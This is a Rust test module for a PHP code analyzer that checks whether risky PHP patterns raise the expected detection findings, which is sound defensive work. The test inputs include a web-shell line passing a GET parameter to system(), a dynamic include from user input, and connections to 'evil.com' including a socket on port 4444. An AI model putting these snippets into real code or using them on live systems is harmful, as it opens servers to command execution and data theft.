#[cfg(test)]
mod tests {
    use crate::analyzers::php::PhpAnalyzer;
    use crate::types::{AnalysisReport, Criticality};
    use std::path::PathBuf;

    fn analyze_php_code(code: &str) -> AnalysisReport {
        let analyzer = PhpAnalyzer::new();
        let path = PathBuf::from("test.php");
        analyzer.analyze_source(&path, code).unwrap()
    }

    #[test]
    fn test_structural_feature() {
        let code = r#"<?php echo "Hello"; ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .structure
            .iter()
            .any(|s| s.id == "source/language/php"));
    }

    #[test]
    fn test_detect_exec() {
        let code = r#"<?php exec("whoami"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_shell_exec() {
        let code = r#"<?php $out = shell_exec("ls -la"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_system() {
        let code = r#"<?php system($_GET['cmd']); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/command/shell"));
    }

    #[test]
    fn test_detect_eval() {
        let code = r#"<?php eval($code); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/script/eval"));
    }

    #[test]
    fn test_detect_base64_decode() {
        let code = r#"<?php $x = base64_decode($encoded); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/obfuscation/base64"));
    }

    #[test]
    fn test_detect_unserialize() {
        let code = r#"<?php $obj = unserialize($data); ?>"#;
        let report = analyze_php_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/deserialization"));
    }

    #[test]
    fn test_detect_file_operations() {
        let code = r#"<?php
            $content = file_get_contents("config.php");
            file_put_contents("shell.php", $payload);
        ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "fs/read"));
        assert!(report.findings.iter().any(|c| c.id == "fs/write"));
    }

    #[test]
    fn test_detect_curl() {
        let code = r#"<?php
            $ch = curl_init("http://evil.com");
            curl_exec($ch);
        ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/http/client"));
    }

    #[test]
    fn test_detect_socket() {
        let code = r#"<?php $sock = fsockopen("evil.com", 4444); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/socket/create"));
    }

    #[test]
    fn test_detect_include() {
        let code = r#"<?php include("config.php"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "fs/include"));
    }

    #[test]
    fn test_detect_dynamic_include_hostile() {
        let code = r#"<?php include($_GET['page']); ?>"#;
        let report = analyze_php_code(code);
        let cap = report
            .findings
            .iter()
            .find(|c| c.id == "fs/include")
            .unwrap();
        assert_eq!(cap.crit, Criticality::Hostile);
    }

    #[test]
    fn test_detect_pdo() {
        let code = r#"<?php $pdo = new PDO("mysql:host=localhost", "user", "pass"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "database/pdo"));
    }

    #[test]
    fn test_detect_mail() {
        let code = r#"<?php mail("admin@example.com", "Subject", "Body"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "net/email/send"));
    }

    #[test]
    fn test_extract_functions() {
        let code = r#"<?php
            function hello($name) {
                return "Hello, " . $name;
            }
            function goodbye() {
                echo "Bye";
            }
        ?>"#;
        let report = analyze_php_code(code);
        assert_eq!(report.functions.len(), 2);
        assert!(report.functions.iter().any(|f| f.name == "hello"));
        assert!(report.functions.iter().any(|f| f.name == "goodbye"));
    }

    #[test]
    fn test_detect_dynamic_call() {
        let code = r#"<?php $func = "system"; $func("whoami"); ?>"#;
        let report = analyze_php_code(code);
        assert!(report.findings.iter().any(|c| c.id == "exec/dynamic-call"));
    }

    #[test]
    fn test_detect_non_ascii_call() {
        let code = "<?php $ִ('payload'); ?>";
        let report = analyze_php_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/obfuscation/non-ascii-call"));
    }

    #[test]
    fn test_detect_long_identifier() {
        let code = "<?php $unusually_long_variable_name_for_obfuscation = 1; ?>";
        let report = analyze_php_code(code);
        assert!(report
            .findings
            .iter()
            .any(|c| c.id == "anti-analysis/obfuscation/long-identifier"));
    }

    #[test]
    fn test_lossy_utf8_reading() {
        let analyzer = PhpAnalyzer::new();
        let invalid_utf8 = vec![
            0x3c, 0x3f, 0x70, 0x68, 0x70, 0x20, 0xff, 0xfe, 0xfd, 0x20, 0x3f, 0x3e,
        ];
        let content = String::from_utf8_lossy(&invalid_utf8);
        let path = PathBuf::from("test_invalid.php");
        let report = analyzer.analyze_source(&path, &content).unwrap();
        assert_eq!(report.target.file_type, "php");
    }
}
